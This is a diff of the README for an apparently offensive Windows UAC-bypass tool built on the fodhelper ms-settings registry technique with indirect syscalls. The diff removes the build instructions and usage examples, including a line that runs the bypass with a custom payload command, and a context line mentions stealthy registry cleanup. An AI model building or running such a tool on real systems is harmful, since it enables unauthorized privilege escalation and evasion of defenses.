@@ -124,30 +124,6 @@ LSTATUS RegRenameKey(
 [Cleanup] Delete ms-settings\Shell\Open\command (NtDeleteKey — indirect syscall)
 ```
 
-## Building the Project
-
-```powershell
-# Using MSBuild
-msbuild FODHelperUACBypass_NG\FODHelperUACBypass_NG.csproj /p:Configuration=Release /p:Platform=x64
-
-# Or open FODHelperUACBypass_NG.sln in Visual Studio and build Release|x64
-```
-
-Output: `FODHelperUACBypass_NG\bin\x64\Release\FODHelperUACBypass_NG.exe`
-
-## Usage
-
-```powershell
-# Run the UAC bypass (default payload)
-.\FODHelperUACBypass_NG.exe
-
-# Run with a custom payload command
-.\FODHelperUACBypass_NG.exe "cmd.exe /c whoami > c:\temp\out.txt"
-
-# Run syscall diagnostic tests
-.\FODHelperUACBypass_NG.exe -test
-```
-
 ## Error Handling
 
 The implementation includes detailed error messages for common failures:
